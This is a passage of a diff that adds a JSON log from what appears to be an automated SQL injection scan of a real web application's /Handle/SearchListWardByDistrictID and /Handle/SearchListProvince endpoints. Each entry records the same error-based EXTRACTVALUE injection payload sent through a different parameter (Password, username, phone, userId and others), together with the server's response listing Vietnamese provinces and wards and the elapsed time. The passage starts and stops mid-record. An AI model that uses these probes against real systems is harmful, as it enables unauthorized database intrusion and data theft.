+      "response": "[{\"ID\":67690,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":67692,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":85580,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":64358,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":62360,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":65577,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59549,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59550,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":65586,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66255,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":67694,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":79662,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":79666,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59523,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59524,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59525,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66402,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66408,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59551,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59552,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59553,\"Code\":",
+      "elapsed": 5.3739800453186035
+    },
+    {
+      "method": "POST",
+      "endpoint": "/Handle/SearchListWardByDistrictID",
+      "param": "q",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "[{\"ID\":67690,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":67692,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":85580,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":64358,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":62360,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":65577,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59549,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59550,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":65586,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66255,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":67694,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":79662,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":79666,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59523,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59524,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59525,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66402,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66408,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59551,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59552,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59553,\"Code\":",
+      "elapsed": 4.57967734336853
+    },
+    {
+      "method": "GET",
+      "endpoint": "/Handle/SearchListWardByDistrictID",
+      "param": "name",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "[{\"ID\":67690,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":67692,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":85580,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":64358,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":62360,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":65577,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59549,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59550,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":65586,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66255,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":67694,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":79662,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":79666,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59523,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59524,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59525,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66402,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66408,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59551,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59552,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59553,\"Code\":",
+      "elapsed": 4.087565660476685
+    },
+    {
+      "method": "GET",
+      "endpoint": "/Handle/SearchListWardByDistrictID",
+      "param": "phone",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "[{\"ID\":67690,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":67692,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":85580,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":64358,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":62360,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":65577,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59549,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59550,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":65586,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66255,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":67694,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":79662,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":79666,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59523,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59524,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59525,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66402,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66408,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59551,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59552,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59553,\"Code\":",
+      "elapsed": 4.017795562744141
+    },
+    {
+      "method": "JSON",
+      "endpoint": "/Handle/SearchListProvince",
+      "param": "WareHouseID",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "[{\"ID\":88,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh An Giang\"},{\"ID\":79,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Bà Rịa - Vũng Tàu\"},{\"ID\":82,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Bình Dương\"},{\"ID\":83,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Bình Phước\"},{\"ID\":80,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Bình Thuận\"},{\"ID\":59,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Bình Định\"},{\"ID\":96,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Bạc Liêu\"},{\"ID\":23,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Bắc Giang\"},{\"ID\":26,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Bắc Kạn\"},{\"ID\":22,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Bắc Ninh\"},{\"ID\":93,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Bến Tre\"},{\"ID\":27,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Cao Bằng\"},{\"ID\":97,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Cà Mau\"},{\"ID\":90,\"Code\":null,\"Title\":null,\"Name\":\"Thành phố Cần Thơ\"},{\"ID\":60,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Gia Lai\"},{\"ID\":31,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Hà Giang\"},{\"ID\":40,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Hà Nam\"}",
+      "elapsed": 8.314050912857056
+    },
+    {
+      "method": "JSON",
+      "endpoint": "/Handle/SearchListWardByDistrictID",
+      "param": "search",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "[{\"ID\":67690,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":67692,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":85580,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":64358,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":62360,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":65577,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59549,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59550,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":65586,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66255,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":67694,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":79662,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":79666,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59523,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59524,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59525,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66402,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66408,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59551,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59552,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59553,\"Code\":",
+      "elapsed": 5.441801309585571
+    },
+    {
+      "method": "JSON",
+      "endpoint": "/Handle/SearchListWardByDistrictID",
+      "param": "name",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "[{\"ID\":67690,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":67692,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":85580,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":64358,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":62360,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":65577,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59549,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59550,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":65586,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66255,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":67694,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":79662,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":79666,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59523,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59524,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59525,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66402,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66408,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59551,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59552,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59553,\"Code\":",
+      "elapsed": 5.579933166503906
+    },
+    {
+      "method": "GET",
+      "endpoint": "/Handle/SearchListWardByDistrictID",
+      "param": "query",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "[{\"ID\":67690,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":67692,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":85580,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":64358,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":62360,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":65577,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59549,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59550,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":65586,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66255,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":67694,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":79662,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":79666,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59523,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59524,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59525,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66402,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66408,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59551,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59552,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59553,\"Code\":",
+      "elapsed": 6.805852890014648
+    },
+    {
+      "method": "GET",
+      "endpoint": "/Handle/SearchListWardByDistrictID",
+      "param": "Password",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "[{\"ID\":67690,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":67692,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":85580,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":64358,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":62360,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":65577,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59549,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59550,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":65586,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66255,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":67694,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":79662,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":79666,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59523,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59524,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59525,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66402,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66408,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59551,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59552,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59553,\"Code\":",
+      "elapsed": 4.237306356430054
+    },
+    {
+      "method": "POST",
+      "endpoint": "/Handle/SearchListWardByDistrictID",
+      "param": "Password",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "[{\"ID\":67690,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":67692,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":85580,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":64358,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":62360,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":65577,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59549,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59550,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":65586,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66255,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":67694,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":79662,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":79666,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59523,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59524,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59525,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66402,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66408,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59551,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59552,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59553,\"Code\":",
+      "elapsed": 4.49105429649353
+    },
+    {
+      "method": "JSON",
+      "endpoint": "/Handle/SearchListWardByDistrictID",
+      "param": "userId",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "[{\"ID\":67690,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":67692,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":85580,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":64358,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":62360,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":65577,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59549,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59550,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":65586,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66255,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":67694,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":79662,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":79666,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59523,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59524,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59525,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66402,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66408,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59551,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59552,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59553,\"Code\":",
+      "elapsed": 8.17223596572876
+    },
+    {
+      "method": "JSON",
+      "endpoint": "/Handle/SearchListProvince",
+      "param": "ProvinceID",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "[{\"ID\":88,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh An Giang\"},{\"ID\":79,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Bà Rịa - Vũng Tàu\"},{\"ID\":82,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Bình Dương\"},{\"ID\":83,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Bình Phước\"},{\"ID\":80,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Bình Thuận\"},{\"ID\":59,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Bình Định\"},{\"ID\":96,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Bạc Liêu\"},{\"ID\":23,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Bắc Giang\"},{\"ID\":26,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Bắc Kạn\"},{\"ID\":22,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Bắc Ninh\"},{\"ID\":93,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Bến Tre\"},{\"ID\":27,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Cao Bằng\"},{\"ID\":97,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Cà Mau\"},{\"ID\":90,\"Code\":null,\"Title\":null,\"Name\":\"Thành phố Cần Thơ\"},{\"ID\":60,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Gia Lai\"},{\"ID\":31,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Hà Giang\"},{\"ID\":40,\"Code\":null,\"Title\":null,\"Name\":\"Tỉnh Hà Nam\"}",
+      "elapsed": 10.317989587783813
+    },
+    {
+      "method": "JSON",
+      "endpoint": "/Handle/SearchListWardByDistrictID",
+      "param": "MobileNumber",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "[{\"ID\":67690,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":67692,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":85580,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":64358,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":62360,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":65577,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59549,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59550,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":65586,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66255,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":67694,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":79662,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":79666,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59523,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59524,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59525,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66402,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66408,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59551,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59552,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59553,\"Code\":",
+      "elapsed": 5.596197843551636
+    },
+    {
+      "method": "JSON",
+      "endpoint": "/Handle/SearchListWardByDistrictID",
+      "param": "DistrictID",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "[{\"ID\":67690,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":67692,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":85580,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":64358,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":62360,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":65577,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59549,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59550,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":65586,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66255,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":67694,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":79662,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":79666,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59523,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59524,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59525,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66402,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66408,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59551,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59552,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59553,\"Code\":",
+      "elapsed": 4.679517507553101
+    },
+    {
+      "method": "JSON",
+      "endpoint": "/Handle/SearchListWardByDistrictID",
+      "param": "Password",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "[{\"ID\":67690,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":67692,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":85580,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":64358,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":62360,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":65577,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59549,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59550,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":65586,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66255,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":67694,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":79662,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":79666,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59523,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59524,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59525,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66402,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66408,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59551,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59552,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59553,\"Code\":",
+      "elapsed": 5.744024991989136
+    },
+    {
+      "method": "JSON",
+      "endpoint": "/Handle/SearchListWardByDistrictID",
+      "param": "phone",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "[{\"ID\":67690,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":67692,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":85580,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":64358,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":62360,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":65577,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59549,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59550,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":65586,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66255,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":67694,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":79662,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":79666,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59523,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59524,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59525,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66402,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66408,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59551,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59552,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59553,\"Code\":",
+      "elapsed": 7.4490966796875
+    },
+    {
+      "method": "JSON",
+      "endpoint": "/Handle/SearchListWardByDistrictID",
+      "param": "username",
+      "payload": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT 'TEST'), 0x7e))--",
+      "response": "[{\"ID\":67690,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":67692,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":85580,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":64358,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":62360,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":65577,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59549,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59550,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":65586,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":66255,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":67694,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":79662,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":79666,\"Code\":null,\"Title\":null,\"Name\":\" \"},{\"ID\":59523,\"Code\":null,\"Title\":null,\"Name\":\" 